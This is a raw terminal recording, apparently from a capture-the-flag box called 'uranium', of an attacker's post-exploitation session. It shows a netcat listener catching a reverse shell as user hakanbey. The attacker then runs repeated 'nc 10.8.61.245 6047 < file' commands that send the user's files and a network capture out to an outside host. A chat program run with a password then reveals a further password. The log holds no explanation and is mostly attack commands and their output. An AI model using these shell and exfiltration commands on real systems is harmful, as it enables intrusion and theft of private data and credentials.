@@ -1,0 +1,129 @@
+Script started on 2025-04-13 01:00:43+03:00 [COMMAND="rlwrap nc -lnvp 4444" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 4444 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 9803
+bash: cannot set terminal process group (1594): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+hakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+chat_with_kral4
+mail_file
+user_1.txt
+hakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ cat[K[K[Kwhich dd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich dd
+[Kwhich dd[Kwhich dd[Kwhich dd
+hakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ d[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hd
+[K[?2004hd[K[?2004ld[K[?2004hdd[K[?2004l[Kd
+d: command not found
+hakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ dd --help[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd --help
+[Kdd --help[Kdd --help[Kdd --help
+bash: /bin/dd: Permission denied
+hakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ which nc[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich nc
+[Kwhich nc[Kwhich nc[Kwhich nc
+/bin/nc
+hakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ cat [K[K[K[K[7mzip -r send_this.zip chat_with_kral4 mail_file user_1.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hzip -r send_this.zip chat_with_kral4 mail_file user_1.txt
+[Kzip -r send_this.zip chat_with_kral4 mail_file user_1.txt[Kzip -r send_this.zip chat_with_kral4 mail_file user_1.txt[Kzip -r send_this.zip chat_with_kral4 mail_file user_1.txt
+
+Command 'zip' not found, but can be installed with:
+
+apt install zip
+
+Please ask your administrator.
+hakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ nc 10.8.61.245 6047 < [7mchat_with_kral4[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7mnc 10.8.61.245 6047 < [27mchat_with_kral4[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnc 10.8.61.245 6047 < chat_with_kral4
+[Knc 10.8.61.245 6047 < chat_with_kral4[Knc 10.8.61.245 6047 < chat_with_kral4[Knc 10.8.61.245 6047 < chat_with_kral4
+[Khakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ nc 10.8.61.245 6047 < chat_with_kral4[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnc 10.8.61.245 6047 < chat_with_kral4
+[Knc 10.8.61.245 6047 < chat_with_kral4[Knc 10.8.61.245 6047 < chat_with_kral4[Knc 10.8.61.245 6047 < chat_with_kral4
+[Khakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ nc 10.8.61.245 6047 < chat_with_kral4[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kks [K[K[Kls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 100
+drwxr-xr-x 7 hakanbey hakanbey  4096 May  4  2021 .
+drwxr-xr-x 4 root     root      4096 Apr 23  2021 ..
+lrwxrwxrwx 1 root     root         9 Apr 25  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 hakanbey hakanbey   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 hakanbey hakanbey  3771 Apr  4  2018 .bashrc
+drwx------ 2 hakanbey hakanbey  4096 Apr  9  2021 .cache
+-rwxrwxr-x 1 hakanbey hakanbey 49376 Apr  9  2021 chat_with_kral4
+drwxr-x--- 3 hakanbey hakanbey  4096 Apr 10  2021 .config
+drwx------ 4 hakanbey hakanbey  4096 Apr 10  2021 .gnupg
+drwxrwxr-x 3 hakanbey hakanbey  4096 Apr  9  2021 .local
+drwxrwxr-x 2 hakanbey hakanbey  4096 Apr 12 22:12 mail_file
+-rw-r--r-- 1 hakanbey hakanbey   807 Apr  4  2018 .profile
+-rw-rw-r-- 1 hakanbey hakanbey    66 Apr  9  2021 .selected_editor
+-rw-r--r-- 1 hakanbey hakanbey     0 Apr  9  2021 .sudo_as_admin_successful
+-rw-rw-r-- 1 hakanbey hakanbey    38 Apr 10  2021 user_1.txt
+hakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ ls -alnc 10.8.61.245 6047 < chat_with_kral4[C[K[K[K[7mmail_file[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7mnc 10.8.61.245 6047 < [27mmail_file[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnc 10.8.61.245 6047 < mail_file
+[Knc 10.8.61.245 6047 < mail_file[Knc 10.8.61.245 6047 < mail_file[Knc 10.8.61.245 6047 < mail_file
+[Khakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ nc 10.8.61.245 6047 < mail_file[K[K[7muser_1.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7mnc 10.8.61.245 6047 < [27muser_1.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnc 10.8.61.245 6047 < user_1.txt
+[Knc 10.8.61.245 6047 < user_1.txt[Knc 10.8.61.245 6047 < user_1.txt[Knc 10.8.61.245 6047 < user_1.txt
+[Khakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ cd mail_file[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd mail_file
+[Kcd mail_file[Kcd mail_file[Kcd mail_file
+hakanbey@uranium:~/mail_file$ [Khakanbey@uranium:~/mail_file$ [K[?2004hhakanbey@uranium:~/mail_file$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+hakanbey@uranium:~/mail_file$ [Khakanbey@uranium:~/mail_file$ [K[?2004hhakanbey@uranium:~/mail_file$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 8
+drwxrwxr-x 2 hakanbey hakanbey 4096 Apr 12 22:14 .
+drwxr-xr-x 7 hakanbey hakanbey 4096 May  4  2021 ..
+hakanbey@uranium:~/mail_file$ [Khakanbey@uranium:~/mail_file$ [K[?2004hhakanbey@uranium:~/mail_file$ ls -al /var/log[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al /var/log
+[Kls -al /var/log[Kls -al /var/log[Kls -al /var/log
+total 1776
+drwxrwxr-x  11 root      syslog            4096 May  6  2021 .
+drwxr-xr-x  14 root      root              4096 Apr  9  2021 ..
+-rw-r--r--   1 root      root               178 May  4  2021 alternatives.log
+drwx------   3 root      root              4096 May  6  2021 amazon
+drwxr-x---   2 root      adm               4096 Apr  9  2021 apache2
+-rw-r-----   1 root      adm               1126 May  4  2021 apport.log
+drwxr-xr-x   2 root      root              4096 May  4  2021 apt
+-rw-r-----   1 syslog    adm              45136 Apr 12 22:17 auth.log
+-rw-r--r--   1 root      root               709 May  6  2021 aws114_ssm_agent_installation.log
+-rw-r--r--   1 root      root                 0 Apr 25  2021 bootstrap.log
+-rw-rw----   1 root      utmp               384 May  6  2021 btmp
+-rw-r--r--   1 syslog    adm             406513 Apr 12 21:50 cloud-init.log
+-rw-r-----   1 root      adm              19639 Apr 12 21:50 cloud-init-output.log
+drwxr-xr-x   2 root      root              4096 Jul  9  2020 dist-upgrade
+-rw-r--r--   1 root      root             93038 May  6  2021 dpkg.log
+-rw-r--r--   1 root      root                 0 Apr 25  2021 faillog
+-rw-r--r--   1 root      root              1869 Apr 24  2021 hakanbey_network_log.pcap
+drwxr-xr-x   3 root      root              4096 Apr  9  2021 installer
+drwxr-sr-x+  3 root      systemd-journal   4096 Apr  9  2021 journal
+-rw-r-----   1 syslog    adm             353807 Apr 12 21:51 kern.log
+drwxr-xr-x   2 landscape landscape         4096 Apr  9  2021 landscape
+-rw-rw-r--   1 root      utmp            292292 May  6  2021 lastlog
+-rw-r-----   1 syslog    adm              61045 Apr 12 22:17 mail.log
+drwxr-xr-x   2 root      root              4096 May 14  2019 openvpn
+-rw-r-----   1 syslog    adm             703451 Apr 12 22:17 syslog
+-rw-------   1 root      root                 0 Apr 25  2021 tallylog
+drwxr-x---   2 root      adm               4096 Apr  9  2021 unattended-upgrades
+-rw-rw-r--   1 root      utmp             23040 Apr 12 21:50 wtmp
+hakanbey@uranium:~/mail_file$ [Khakanbey@uranium:~/mail_file$ [K[?2004hhakanbey@uranium:~/mail_file$ ls -al /var/log[K[Kcd mail_filenc 10.8.61.245 6047 < user_1.txt[K[K[K[K[K[K[K[K[K[K/var/log/[7mhakanbey_network_log.pcap[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7mnc 10.8.61.245 6047 < /var/log/[27mhakanbey_network_log.pcap[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnc 10.8.61.245 6047 < /var/log/hakanbey_network_log.pcap
+[K<.8.61.245 6047 < /var/log/hakanbey_network_log.pcap[K<.8.61.245 6047 < /var/log/hakanbey_network_log.pcap[K<.8.61.245 6047 < /var/log/hakanbey_network_log.pcap
+[Khakanbey@uranium:~/mail_file$ [Khakanbey@uranium:~/mail_file$ [K[?2004hhakanbey@uranium:~/mail_file$ cd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd
+[Kcd[Kcd[Kcd
+hakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+chat_with_kral4
+mail_file
+user_1.txt
+hakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ ./ch        [Kat_with_lral;[K[K[K[K[Kkral4[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./chat_with_kral4
+[K./chat_with_kral4[K./chat_with_kral4[K./chat_with_kral4
+PASSWORD :[KPASSWORD :[K[?2004hPASSWORD :[7mMBMD1vdpjg3kGv6SsIz56VNG[27m[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hMBMD1vdpjg3kGv6SsIz56VNG
+[Kkral4:hi hakanbey
+
+->[K->[K[?2004h->hello[C[C[?2004l[C[C[K[?2004hhello
+[Khakanbey:hello
+kral4:how are you?
+
+->[K->[K[?2004h->fine bro[C[C[?2004l[C[C[K[?2004hfine bro
+[Khakanbey:fine bro
+kral4:what now? did you forgot your password again
+
+->[K->[K[?2004h->yes[?2004l[C[C[K[?2004hyes
+[Khakanbey:yes
+kral4:okay your password is Mys3cr3tp4sw0rD don't lose it PLEASE
+kral4:i have to go
+kral4 disconnected
+
+connection terminated
+[Khakanbey@uranium:~$ [Khakanbey@uranium:~$ [K[?2004hhakanbey@uranium:~$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-04-13 01:22:48+03:00 [COMMAND_EXIT_CODE="0"]
